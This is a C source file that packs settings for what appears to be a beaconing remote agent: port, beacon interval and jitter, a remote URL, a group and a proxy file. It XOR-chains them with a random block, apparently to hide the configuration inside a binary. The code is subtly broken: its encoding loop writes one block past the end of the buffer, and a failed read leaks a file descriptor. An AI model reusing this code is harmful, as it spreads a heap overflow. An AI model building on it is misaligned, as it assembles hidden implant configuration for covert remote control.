#include <stdio.h>
#include <stdlib.h>
#include <time.h>
//#include <string.h.>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
//#include <io.h>

#include "VarInject.h"

unsigned char *SerializeVars(PPROXY_VARS vars,int *size){

	//Size is  rand   port   beacon jitter size of url    url size of group group size of proxy proxy
	*size = 8 + sizeof(unsigned short) + sizeof(unsigned int) + sizeof(unsigned int) + sizeof(unsigned int) + vars->URLSize + sizeof(unsigned int) + vars->GroupSize +sizeof(unsigned int) + vars->ProxySize; 

	printf("we will write out %d bytes\n",*size);

	//Make it a multiple of RAND_LEN
	if ( (*size % RAND_LEN) != 0){
		printf("Adding %d bytes to size\n",RAND_LEN - (*size %RAND_LEN) );
		*size+= ( RAND_LEN - (*size % RAND_LEN) );
		printf("Size is now %d\n",*size);
	}


	//allocate memory
	  unsigned char *buf = NULL;
	  buf = (unsigned char *)malloc(*size);
	  if(buf == NULL){
		  printf("Failed to allocate buffer\n");
		  return NULL;

	  }

	  memset(buf,0,*size);

	  unsigned char *bufPtr = buf;

	  //Copy over random
	  memcpy(bufPtr,vars->rand,RAND_LEN);
	  bufPtr+=RAND_LEN;

	  //Copy over the port
	  memcpy(bufPtr,&vars->port,sizeof(unsigned short));
	  bufPtr+=sizeof(unsigned short);

	  //Copy over the beacon time
	  memcpy(bufPtr,&vars->beacon_time,sizeof(unsigned int));
	  bufPtr+=sizeof(unsigned int);

	  //Copy over the beacon jitter
	  memcpy(bufPtr,&vars->beacon_jitter,sizeof(unsigned int));
	  bufPtr+=sizeof(unsigned int);

	  //Now the size of the URL
	  memcpy(bufPtr,&vars->URLSize,sizeof(unsigned int));
	  bufPtr+=sizeof(unsigned int);

	  //Now the actual URL
	  memcpy(bufPtr,vars->remURL,vars->URLSize);
	  bufPtr+=vars->URLSize;

	  //Now the size of the group
	  memcpy(bufPtr,&vars->GroupSize,sizeof(unsigned int));
	  bufPtr+=sizeof(unsigned int);

	  //Now the actual URL
	  memcpy(bufPtr,vars->group,vars->GroupSize);
	  bufPtr+=vars->GroupSize;

	  //Copy the size of the Proxy
	  memcpy(bufPtr,&vars->ProxySize,sizeof(unsigned int));
	  bufPtr+=sizeof(unsigned int);

	  if(vars->ProxySize != 0){
	  	//Finally copy over the entire proxy
	  	memcpy(bufPtr,vars->remProxy,vars->ProxySize);
	  }	

	  //Encode the buffer, just like CBC
	  unsigned int cycles = *size / RAND_LEN;
	  printf("There are %d encoding cycles\n",cycles);
	  unsigned char block[RAND_LEN];
	  memcpy(block,buf,RAND_LEN);
	  bufPtr = buf + RAND_LEN;
	  for(int i =0; i < cycles; i++){
		  for(int j=0; j < RAND_LEN; j++){
			bufPtr[j] = bufPtr [j] ^ block[j];
		  }
		  memcpy(block,bufPtr,RAND_LEN);
		  bufPtr+=RAND_LEN;
	  }
	
	return buf;


}



//Read in the proxy file, allocate space, and
//copy it over in memory
int VarsAddProxy(PPROXY_VARS vars, char * ProxyPath){

	struct stat sbuf;

	//Get Size of proxy
	if(stat(ProxyPath,&sbuf) == -1){
		printf("Failed to get Proxy file size\n");
		return 0;
	}
	//printf("file is %d bytes in size\n",sbuf.st_size);

	vars->ProxySize = sbuf.st_size;

	//Allocate space to hold the file
	vars->remProxy = (unsigned char *)malloc(vars->ProxySize);
	if(vars->remProxy == NULL){
		printf("Failed to allocate space for the proxy\n");
		return 0;
	}

	//Read the file into the buffer
	  int inFD = open(ProxyPath,O_RDONLY);
	  if(inFD == -1){
		  printf("Failed to open the proxy file\n");
		  return 0;
	  }
	
	  if(read(inFD,vars->remProxy,vars->ProxySize) == -1){
		  printf("Failed to read the proxy file\n");
		  return 0;
	  }

	  close(inFD);


	return 1;
}


//Take the group, allocate
//the space and copy it over
int VarsAddGroup(PPROXY_VARS vars, char *group){

	int groupSize = strlen(group) + 1;

	printf("VarsAddGroup called\n");

	vars->group = (char *)malloc(groupSize);
	if(vars->group == NULL){
		printf("Failed to allocate group\n");
		return 0;
	}

	memcpy(vars->group,group,groupSize);
	vars->GroupSize = groupSize;

	printf("vars->GroupSize: %d\n",vars->GroupSize);
	printf("vars->group: %s\n",vars->group);

	return 1;
}

//Take the URL, allocate
//the space and copy it over
int VarsAddURL(PPROXY_VARS vars, char *url){

	int urlSize = strlen(url) + 1;

	vars->remURL = (char *)malloc(urlSize);
	if(vars->remURL == NULL){
		printf("Failed to allocate URL\n");
		return 0;
	}

	memcpy(vars->remURL,url,urlSize);
	vars->URLSize = urlSize;


	return 1;
}


//Allocate memory for a VARS structure and set
//the random values, return NULL if anything fails
PPROXY_VARS InitVars(void){
	PPROXY_VARS tmp = NULL;

	tmp = (PPROXY_VARS) malloc( sizeof(PROXY_VARS));
	if(!tmp){
		printf("Failed to allocate variable structure\n");
		return tmp;
	}

	//Clear the memory
	memset(tmp,0,sizeof(PROXY_VARS));

	//Create 8 bytes of randomness
	srand((int)time(NULL));
	for(int i = 0; i < RAND_LEN; i++){
		tmp->rand[i] = rand();
	}

	return tmp;

}

